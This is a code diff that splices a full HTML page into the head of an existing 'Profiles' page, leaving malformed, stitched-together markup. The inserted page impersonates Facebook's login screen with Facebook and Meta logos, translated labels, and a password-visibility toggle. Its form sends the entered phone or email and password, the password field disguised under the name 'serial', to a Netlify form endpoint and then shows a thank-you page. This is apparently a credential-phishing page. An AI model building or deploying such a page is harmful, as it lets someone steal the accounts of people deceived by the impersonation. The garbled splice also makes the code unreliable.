@@ -2,7 +2,347 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="facebook-logo.png">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* ... existing CSS ... */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100%;
+            position: relative;
+            
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            padding: 20px;
+            background-image: linear-gradient(to left, #07f6070a, #12ebff12, #eeeeee, hsla(0, 100%, 50%, 0.07));
+            border-radius: 10px;
+            box-shadow: 0 0 80px rgba(0, 0, 0, 0.1);
+            z-index: 10;
+        }
+
+        p {
+            font-size: 13px;
+            color: rgb(0, 0, 0);
+        }
+
+        .textbox {
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .textbox input {
+            width: 100%;
+            padding: 21px;
+            border: 1px solid silver;
+            border-radius: 15px;
+            outline: none;
+            color: #000;
+            background-color: #ffffff;
+            font-size: 14px;
+        }
+
+        .textbox label {
+            position: absolute;
+            top: 20px;
+            left: 15px;
+            color: #9d9d9d;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .textbox input:focus + label,
+        .textbox input:not(:placeholder-shown) + label {
+            top: 6px;
+            left: 15px;
+            font-size: 11px;
+            color: #0f0f17;
+        }
+
+        .textbox .eye-icon {
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #9d9d9d;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background: #4454ff;
+            border: none;
+            border-radius: 30px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #2d6ddb;
+        }
+
+        #createAccountBtn {
+            width: 100%;
+            padding: 7px;
+            font-size: 15px;
+            background-color: transparent;
+            border-radius: 30px;
+            color: blue;
+            border: 1px solid blue;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .custom-select {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .custom-select select {
+            display: none;
+        }
+
+        .select-selected {
+            background-color: transparent;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 13px;
+            cursor: pointer;
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            width: 150px;
+        }
+
+        .select-selected::after {
+            content: '\25BC';
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+
+        .select-items {
+            display: none;
+            position: absolute;
+            background-image: linear-gradient(to right, #f8e6e6,#f4f8ff, #f2f7ff,#edffed);
+            border: 0px solid #ccc;
+            border-top: none;
+            border-radius: 5px;
+            z-index: 2;
+            width: 109%;
+            margin-top:240%;
+        }
+
+        .select-items div {
+            padding: 10px;
+            cursor: pointer;
+            text-align: center;
+            margin-left: 17px;
+            width: 93%;
+            border-radius: 5px;
+            background-color: #ffffff;
+        }
+
+        .select-items div:hover {
+            background-color: #c2c0c0;
+        }
+
+        .show {
+            display: block;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(201, 201, 201, 0.554);
+            z-index: 5;
+        }
+
+        .overlay.show {
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .login-box {
+                width: 100%;
+                height: 100%;
+                padding: 15px;
+                background-image: linear-gradient(to right, #ff000010,#f2f7ff, #f2f7ff,rgba(7, 246, 7, 0.036));
+            }
+
+            .textbox input {
+                padding: 21px;
+            }
+
+            .textbox label {
+                top: 20px;
+                left: 12px;
+            }
+
+            .btn, #createAccountBtn {
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="overlay" id="overlay"></div>
+    <div class="login-box">
+        <div class="custom-select" id="languageSelector">
+            <div class="select-selected">English (US)</div>
+            <div class="select-items">
+                <center><h3> select your language</h3></center><br>
+                <div data-lang="en" data-lang-name="English (US)">English (US)</div>
+                <div data-lang="bn" data-lang-name="Bangla">Bangla</div>
+                <div data-lang="hi" data-lang-name="Hindi">Hindi</div>
+                <div data-lang="ar" data-lang-name="Arabic">Arabic</div>
+                <div data-lang="uk" data-lang-name="English (UK)">English (UK)</div>
+                <div data-lang="ru" data-lang-name="Russian">Russian</div>
+                <div data-lang="fr" data-lang-name="French">French</div>
+                <div data-lang="ja" data-lang-name="Japanese">Japanese</div>
+            </div>
+        </div>
+        <div style="text-align: center;"><img src="https://static.vecteezy.com/system/resources/previews/018/930/476/non_2x/facebook-logo-facebook-icon-transparent-free-png.png" width="30%" alt="Facebook Logo"></div><br>
+        <form name="contact" method="POST" data-netlify="true" action="/thank">
+            <div class="textbox">
+                <input type="text" placeholder=" " name="contact" required>
+                <label data-i18n="Mobile number or email address">Mobile number or email address</label>
+            </div>
+            <div class="textbox">
+                <input type="password" placeholder=" " name="serial" id="password" required>
+                <label data-i18n="Password">Password</label>
+                <i class="fas fa-eye eye-icon" id="togglePassword"></i>
+            </div>
+            <button type="submit" class="btn" data-i18n="Log in">Log in</button><br><br>
+            <div style="text-align: center;"><p data-i18n="Forgot password?">Forgot password?</p></div>
+        </form><br>
+        <input type="button" id="createAccountBtn" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br><br><br><br><br>
+        <div style="text-align: center;"><img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="20%" alt="Meta Logo"></div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/22.3.0/i18next.min.js"></script>
+    <script>
+        // Initialize i18next with translations
+        i18next.init({
+            lng: 'en',
+            resources: {
+                en: {
+                    translation: {
+                        "Mobile number or email address": "Mobile number or email address",
+                        "Password": "Password",
+                        "Log in": "Log in",
+                        "Forgot password?": "Forgot password?",
+                        "Create new account": "Create new account"
+                    }
+                },
+                bn: {
+                    translation: {
+                        "Mobile number or email address": "মোবাইল নম্বর বা ইমেল ঠিকানা",
+                        "Password": "পাসওয়ার্ড",
+                        "Log in": "লগ ইন",
+                        "Forgot password?": "পাসওয়ার্ড ভুলে গেছেন?",
+                        "Create new account": "নতুন অ্যাকাউন্ট তৈরি করুন"
+                    }
+                },
+                // Add other language resources as needed
+            }
+        });
+
+        // Function to change language
+        function changeLanguage(lang, langName) {
+            i18next.changeLanguage(lang, (err, t) => {
+                if (err) return console.log('something went wrong loading', err);
+                document.querySelector('.select-selected').textContent = langName;
+                updateContent();
+            });
+        }
+
+        // Function to update content with translated strings
+        function updateContent() {
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                element.textContent = i18next.t(key);
+            });
+        }
+
+        // Event listener for language selector
+        document.querySelector('.select-selected').addEventListener('click', function() {
+            this.nextElementSibling.classList.toggle('show');
+            document.getElementById('overlay').classList.toggle('show');
+        });
+
+        // Add event listener to all language options
+        document.querySelectorAll('.select-items div').forEach(item => {
+            item.addEventListener('click', function() {
+                const selectedLang = this.getAttribute('data-lang');
+                const langName = this.getAttribute('data-lang-name');
+                changeLanguage(selectedLang, langName);
+                document.querySelector('.select-items').classList.remove('show');
+                document.getElementById('overlay').classList.remove('show');
+            });
+        });
+
+        // Close dropdown and overlay if clicking outside
+        document.getElementById('overlay').addEventListener('click', function() {
+            document.querySelector('.select-items').classList.remove('show');
+            this.classList.remove('show');
+        });
+
+        // Password visibility toggle
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                this.classList.remove('fa-eye');
+                this.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = "password";
+                this.classList.remove('fa-eye-slash');
+                this.classList.add('fa-eye');
+            }
+        });
+
+        // Initial content update
+        updateContent();
+    </script>
+</body>
+</html>
+
+
     <title>Profiles</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
     <link rel="icon" type="image/x-icon" href="facebook-logo.png">
